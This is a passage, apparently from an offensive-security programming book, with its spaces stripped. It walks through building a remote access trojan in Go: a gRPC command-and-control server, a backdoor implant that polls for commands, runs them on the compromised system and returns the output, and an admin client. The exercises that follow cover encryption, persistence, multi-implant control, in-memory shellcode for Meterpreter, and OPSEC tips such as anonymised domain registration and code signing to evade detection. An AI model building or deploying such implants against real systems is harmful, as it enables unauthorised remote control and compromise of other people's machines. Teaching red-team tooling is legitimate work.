fromtheadminclientandtheothertoreceivepollingfromthe
implant.Wehavetwolistenerssothatwecanrestrictaccessto
ouradminAPI—wedon’twantjustanyoneinteractingwithit
—andwewanttohaveourimplantlistenonaportthatyou
canaccessfromrestrictivenetworks.
funcmain(){
❶var(
implantListener,adminListenernet.Listener
errerror
opts[]grpc.ServerOption
work,outputchan*grpcapi.Command
)
❷work,output=make(chan*grpcapi.Command),make(chan
*grpcapi.Command)
❸implant:=NewImplantServer(work,output)
admin:=NewAdminServer(work,output)
❹ifimplantListener,err=net.Listen("tcp",\
fmt.Sprintf("localhost:%d",4444));err!=nil{
log.Fatal(err)
}
ifadminListener,err=net.Listen("tcp",\
fmt.Sprintf("localhost:%d",9090));err!=nil{
log.Fatal(err)
}
❺grpcAdminServer,grpcImplantServer:=\
grpc.NewServer(opts...),grpc.NewServer(opts...)
❻grpcapi.RegisterImplantServer(grpcImplantServer,implant)
grpcapi.RegisterAdminServer(grpcAdminServer,admin)
❼gofunc(){
grpcImplantServer.Serve(implantListener)
}()
❽grpcAdminServer.Serve(adminListener)
}
Listing14-3:Runningadminandimplantservers(/ch-14/server/server.go)
First,wedeclarevariables❶.Weusetwolisteners:onefor
theimplantserverandonefortheadminserver.We’redoing
thissothatwecanserveouradminAPIonaportseparate
fromourimplantAPI.
Wecreatethechannelswe’lluseforpassingmessages
betweentheimplantandadminservices❷.Noticethatweuse
thesamechannelsforinitializingboththeimplantandadmin
serversviacallstoNewImplantServer(work,output)and
NewAdminServer(work,output)❸.Byusingthesamechannel
instances,we’relettingouradminandimplantserverstalkto
eachotheroverthissharedchannel.
Next,weinitiateournetworklistenersforeachserver,
bindingourimplantListenertoport4444andouradminListenerto
port9090❹.We’dgenerallyuseport80or443,whichare
HTTP/sportsthatarecommonlyallowedtoegressnetworks,
butinthisexample,wejustpickedanarbitraryportfortesting
purposesandtoavoidinterferingwithotherservicesrunning
onourdevelopmentmachines.
Wehaveournetwork-levellistenersdefined.Nowweset
upourgRPCserverandAPI.WecreatetwogRPCserver
instances(oneforouradminAPIandoneforourimplantAPI)
bycallinggrpc.NewServer()❺.ThisinitializesthecoregRPC
serverthatwillhandleallthenetworkcommunicationsand
suchforus.WejustneedtotellittouseourAPI.Wedothis
byregisteringinstancesofAPIimplementations(namedimplant
andadmininourexample)bycalling
grpcapi.RegisterImplantServer(grpcImplantServer,implant)❻and
grpcapi.RegisterAdminServer(grpcAdminServer,admin).Noticethat,
althoughwehaveapackagewecreatednamedgrpcapi,we
neverdefinedthesetwofunctions;theprotoccommanddid.It
createdthesefunctionsforusinimplant.pb.goasameansto
createnewinstancesofourimplantandadmingRPCAPI
servers.Prettyslick!
Atthispoint,we’vedefinedtheimplementationsofour
APIandregisteredthemasgRPCservices.Thelastthingwe
doisstartourimplantserverbycalling
grpcImplantServer.Serve(implantListener)❼.Wedothisfromwithina
goroutinetopreventthecodefromblocking.Afterall,we
wanttoalsostartouradminserver,whichwedoviaacallto
grpcAdminServer.Serve(adminListener)❽.
Yourserverisnowcomplete,andyoucanstartitby
runninggorunserver/server.go.Ofcourse,nothingisinteracting
withyourserver,sonothingwillhappenyet.Let’smoveonto
thenextcomponent—ourimplant.
CREATINGTHECLIENTIMPLANT
Theclientimplantisdesignedtorunoncompromised
systems.Itwillactasabackdoorthroughwhichwecanrun
operatingsystemcommands.Inthisexample,theimplantwill
periodicallypolltheserver,askingforwork.Ifthereisno
worktobedone,nothinghappens.Otherwise,theimplant
executestheoperatingsystemcommandandsendstheoutput
backtotheserver.
Listing14-4showsthecontentsofimplant/implant.go.
funcmain(){
var
(
opts[]grpc.DialOption
conn*grpc.ClientConn
errerror
clientgrpcapi.ImplantClient❶
)
opts=append(opts,grpc.WithInsecure())
ifconn,err=grpc.Dial(fmt.Sprintf("localhost:%d",4444),opts...);err!=nil{
❷
log.Fatal(err)
}
deferconn.Close()
client=grpcapi.NewImplantClient(conn)❸
ctx:=context.Background()
for{❹
varreq=new(grpcapi.Empty)
cmd,err:=client.FetchCommand(ctx,req)❺
iferr!=nil{
log.Fatal(err)
}
ifcmd.In==""{
//Nowork
time.Sleep(3*time.Second)
continue
}
tokens:=strings.Split(cmd.In,"")❻
varc*exec.Cmd
iflen(tokens)==1{
c=exec.Command(tokens[0])
}else{
c=exec.Command(tokens[0],tokens[1:]...)
}
buf,err:=c.CombinedOutput()❼
iferr!=nil{
cmd.Out=err.Error()
}
cmd.Out+=string(buf)
client.SendOutput(ctx,cmd)❽
}
}
Listing14-4:Creatingtheimplant(/ch-14/implant/implant.go)
Theimplantcodecontainsamain()functiononly.Westart
bydeclaringourvariables,includingoneofthe
grpcapi.ImplantClienttype❶.Theprotoccommandautomatically
createdthistypeforus.ThetypehasalltherequiredRPC
functionstubsnecessarytofacilitateremotecommunications.
Wethenestablishaconnection,viagrpc.Dial(targetstring,
opts...DialOption),totheimplantserverrunningonport4444
❷.We’llusethisconnectionforthecallto
grpcapi.NewImplantClient(conn)❸(afunctionthatprotoccreatedfor
us).WenowhaveourgRPCclient,whichshouldhavean
establishedconnectionbacktoourimplantserver.
Ourcodeproceedstouseaninfiniteforloop❹topollthe
implantserver,repeatedlycheckingtoseeifthere’sworkthat
needstobeperformed.Itdoesthisbyissuingacallto
client.FetchCommand(ctx,req),passingitarequestcontextandEmpty
struct❺.Behindthescenes,it’sconnectingtoourAPIserver.
Iftheresponsewereceivedoesn’thaveanythinginthecmd.In
field,wepausefor3secondsandthentryagain.Whenaunit
ofworkisreceived,theimplantsplitsthecommandinto
individualwordsandargumentsbycallingstrings.Split(cmd.In,"")
❻.ThisisnecessarybecauseGo’ssyntaxforexecuting
operatingsystemcommandsisexec.Command(name,args...),
wherenameisthecommandtoberunandargs...isalistof
anysubcommands,flags,andargumentsusedbythat
operatingsystemcommand.Godoesthistopreventoperating
systemcommandinjection,butitcomplicatesourexecution,
becausewehavetosplitupthecommandintorelevantpieces
beforewecanrunit.Werunthecommandandgatheroutput
byrunningc.CombinedOutput()❼.Lastly,wetakethatoutputand
initiateagRPCcalltoclient.SendOutput(ctx,cmd)tosendour
commandanditsoutputbacktotheserver❽.
Yourimplantiscomplete,andyoucanrunitviagorun
implant/implant.go.Itshouldconnecttoyourserver.Again,it’llbe
anticlimactic,asthere’snoworktobeperformed.Justa
coupleofrunningprocesses,makingaconnectionbutdoing
nothingmeaningful.Let’sfixthat.
BUILDINGTHEADMIN
COMPONENT
TheadmincomponentisthefinalpiecetoourRAT.It’swhere
we’llactuallyproducework.Theworkwillgetsent,viaour
admingRPCAPI,totheserver,whichthenforwardsitonto
theimplant.Theservergetstheoutputfromtheimplantand
sendsitbacktotheadminclient.Listing14-5showsthecode
inclient/client.go.
funcmain(){
var
(
opts[]grpc.DialOption
conn*grpc.ClientConn
errerror
clientgrpcapi.AdminClient❶
)
opts=append(opts,grpc.WithInsecure())
ifconn,err=grpc.Dial(fmt.Sprintf("localhost:%d",9090),opts...);err!=nil{
❷
log.Fatal(err)
}
deferconn.Close()
client=grpcapi.NewAdminClient(conn)❸
varcmd=new(grpcapi.Command)
cmd.In=os.Args[1]❹
ctx:=context.Background()
cmd,err=client.RunCommand(ctx,cmd)❺
iferr!=nil{
log.Fatal(err)
}
fmt.Println(cmd.Out)❻
}
Listing14-5:Creatingtheadminclient(/ch-14/client/client.go)
Westartbydefiningourgrpcapi.AdminClientvariable❶,
establishingaconnectiontoouradministrativeserveronport
9090❷,andusingtheconnectioninacallto
grpcapi.NewAdminClient(conn)❸,creatinganinstanceofouradmin
gRPCclient.(Rememberthatthegrpcapi.AdminClienttypeand
grpcapi.NewAdminClient()functionwerecreatedforusbyprotoc.)
Beforeweproceed,comparethisclientcreationprocesswith
thatoftheimplantcode.Noticethesimilarities,butalsothe
subtledifferencesintypes,functioncalls,andports.
Assumingthereisacommandlineargument,wereadthe
operatingsystemcommandfromit❹.Ofcourse,thecode
wouldbemorerobustifwecheckedwhetheranargumentwas
passedin,butwe’renotworriedaboutitforthisexample.We
assignthatcommandstringtothecmd.In.Wepassthiscmd,a
*grpcapi.Commandinstance,toourgRPCclient’sRunCommand(ctx
context.Context,cmd*grpcapi.Command)method❺.Behindthe
scenes,thiscommandgetsserializedandsenttotheadmin
serverwecreatedearlier.Aftertheresponseisreceived,we
expecttheoutputtopopulatewiththeoperatingsystem
commandresults.Wewritethatoutputtotheconsole❻.
RUNNINGTHERAT
Now,assumingyouhaveboththeserverandtheimplant
running,youcanexecuteyouradminclientviagorun
client/client.gocommand.Youshouldreceivetheoutputinyour
adminclientterminalandhaveitdisplayedtothescreen,like
this:
$gorunclient/client.go'cat/etc/resolv.conf'
domainHome
nameserver192.168.0.1
nameserver205.171.3.25
Thereitis—aworkingRAT.Theoutputshowsthe
contentsofaremotefile.Runsomeothercommandstosee
yourimplantinaction.
IMPROVINGTHERAT
Aswementionedatthebeginningofthischapter,we
purposelykeptthisRATsmallandfeature-bare.Itwon’tscale
well.Itdoesn’tgracefullyhandleerrorsorconnection
disruptions,anditlacksalotofbasicfeaturesthatallowyou
toevadedetection,moveacrossnetworks,escalateprivileges,
andmore.
Ratherthanmakingalltheseimprovementsinourexample,
weinsteadlayoutaseriesofenhancementsthatyoucanmake
onyourown.We’lldiscusssomeoftheconsiderationsbutwill
leaveeachasanexerciseforyou.Tocompletetheseexercises,
you’lllikelyneedtorefertootherchaptersofthisbook,dig
deeperintoGopackagedocumentation,andexperimentwith
usingchannelsandconcurrency.It’sanopportunitytoput
yourknowledgeandskillstoapracticaltest.Goforthand
makeusproud,youngPadawan.
EncryptYourCommunications
AllC2utilitiesshouldencrypttheirnetworktraffic!Thisis
especiallyimportantforcommunicationsbetweentheimplant
andtheserver,asyoushouldexpecttofindegressnetwork
monitoringinanymodernenterpriseenvironment.
ModifyyourimplanttouseTLSforthesecommunications.
Thiswillrequireyoutosetadditionalvaluesforthe
[]grpc.DialOptionssliceontheclientaswellasontheserver.
Whileyou’reatit,youshouldprobablyalteryourcodesothat
servicesareboundtoadefinedinterface,andlistenand
connecttolocalhostbydefault.Thiswillpreventunauthorized
access.
Aconsiderationyou’llhavetomake,particularlyifyou’ll
beperformingmutualcertificate-basedauthentication,ishow
toadministerandmanagethecertificatesandkeysinthe
implant.Shouldyouhardcodethem?Storethemremotely?
Derivethematruntimewithsomemagicvoodoothat
determineswhetheryourimplantisauthorizedtoconnectto
yourserver?
HandleConnectionDisruptions
Whilewe’reonthetopicofcommunications,whathappensif
yourimplantcan’tconnecttoyourserverorifyourserverdies
witharunningimplant?Youmayhavenoticedthatitbreaks
everything—theimplantdies.Iftheimplantdies,well,you’ve
lostaccesstothatsystem.Thiscanbeaprettybigdeal,
particularlyiftheinitialcompromisehappenedinamanner
that’shardtoreproduce.
Fixthisproblem.Addsomeresiliencetoyourimplantso
thatitdoesn’timmediatelydieifaconnectionislost.Thiswill
likelyinvolvereplacingcallstolog.Fatal(err)inyourimplant.go
filewithlogicthatcallsgrpc.Dial(targetstring,opts
...DialOption)again.
RegistertheImplants
You’llwanttobeabletotrackyourimplants.Atpresent,our
adminclientsendsacommandexpectingonlyasingleimplant
toexist.Thereisnomeansoftrackingorregisteringan
implant,letaloneanymeansofsendingacommandtoa
specificimplant.
Addfunctionalitythatmakesanimplantregisteritselfwith
theserveruponinitialconnection,andaddfunctionalityfor
theadminclienttoretrievealistofregisteredimplants.
Perhapsyouassignauniqueintegertoeachimplantorusea
UUID(checkouthttps://github.com/google/uuid/).Thiswill
requirechangestoboththeadminandimplantAPIs,starting
withyourimplant.protofile.AddaRegisterNewImplantRPC
methodtotheImplantservice,andaddListRegisteredImplantstothe
Adminservice.Recompiletheschemawithprotoc,implementthe
appropriateinterfacemethodsinserver/server.go,andaddthe
newfunctionalitytothelogicinclient/client.go(fortheadmin
side)andimplant/implant.go(fortheimplantside).
AddDatabasePersistence
Ifyoucompletedthepreviousexercisesinthissection,you
addedsomeresiliencetotheimplantstowithstandconnection
disruptionsandsetupregistrationfunctionality.Atthispoint,
you’remostlikelymaintainingthelistofregisteredimplants
inmemoryinserver/server.go.Whatifyouneedtorestartthe
serveroritdies?Yourimplantswillcontinuetoreconnect,but
whentheydo,yourserverwillbeunawareofwhichimplants
areregistered,becauseyou’llhavelostthemappingofthe
implantstotheirUUID.
Updateyourservercodetostorethisdatainadatabaseof
yourchoosing.Forafairlyquickandeasysolutionwith
minimaldependencies,consideraSQLitedatabase.Several
Godriversareavailable.Wepersonallyusedgo-sqlite3
(https://github.com/mattn/go-sqlite3/).
SupportMultipleImplants
Realistically,you’llwanttosupportmultiplesimultaneous
implantspollingyourserverforwork.Thiswouldmakeyour
RATsignificantlymoreuseful,becauseitcouldmanagemore
thanasingleimplant,butitrequiresprettysignificantchanges
aswell.
That’sbecause,whenyouwishtoexecuteacommandon
animplant,you’lllikelywanttoexecuteitonasinglespecific
implant,notthefirstonethatpollstheserverforwork.You
couldrelyontheimplantIDcreatedduringregistrationto
keeptheimplantsmutuallyexclusive,andtodirectcommands
andoutputappropriately.Implementthisfunctionalitysothat
youcanexplicitlychoosethedestinationimplantonwhichthe
commandshouldberun.
Furthercomplicatingthislogic,you’llneedtoconsiderthat
youmighthavemultipleadminoperatorssendingcommands
outsimultaneously,asiscommonwhenworkingwithateam.
Thismeansthatyou’llprobablywanttoconvertyourworkand
outputchannelsfromunbufferedtobufferedtypes.Thiswill
helpkeepexecutionfromblockingwhentherearemultiple
messagesin-flight.However,tosupportthissortof
multiplexing,you’llneedtoimplementamechanismthatcan
matcharequestorwithitsproperresponse.Forexample,if
twoadminoperatorssendworksimultaneouslytoimplants,
theimplantswillgeneratetwoseparateresponses.Ifoperator
1sendsthelscommandandoperator2sendstheifconfig
command,itwouldn’tbeappropriateforoperator1toreceive
thecommandoutputforifconfig,andviceversa.
AddImplantFunctionality
Ourimplementationexpectstheimplantstoreceiveandrun
operatingsystemcommandsonly.However,otherC2software
containsalotofotherconveniencefunctionsthatwouldbe
nicetohave.Forexample,itwouldbenicetobeableto
uploadordownloadfilestoandfromourimplants.Itmightbe
nicetorunrawshellcode,intheeventwewantto,for
example,spawnaMeterpretershellwithouttouchingdisk.
Extendthecurrentfunctionalitytosupporttheseadditional
features.
ChainOperatingSystemCommands
BecauseofthewayGo’sos/execpackagecreatesandruns
commands,youcan’tcurrentlypipetheoutputofone
commandasinputintoasecondcommand.Forexample,this
won’tworkinourcurrentimplementation:ls-la|wc-l.Tofix
this,you’llneedtoplayaroundwiththecommandvariable,
whichiscreatedwhenyoucallexec.Command()tocreatethe
commandinstance.Youcanalterthestdinandstdout
propertiestoredirectthemappropriately.Whenusedin
conjunctionwithanio.Pipe,youcanforcetheoutputofone
command(ls-la,forexample)toactastheinputintoa
subsequentcommand(wc-l).
EnhancetheImplant’sAuthenticityandPractice
GoodOPSEC
GoodOPSEC
Whenyouaddedencryptedcommunicationstotheimplantin
thefirstexerciseinthissection,didyouuseaself-signed
certificate?Ifso,thetransportandbackendservermayarouse
suspicionindevicesandinspectingproxies.Instead,registera
domainnamebyusingprivateoranonymizedcontactdetails
inconjunctionwithacertificateauthorityservicetocreatea
legitimatecertificate.Further,ifyouhavethemeanstodoso,
considerobtainingacode-signingcertificatetosignyour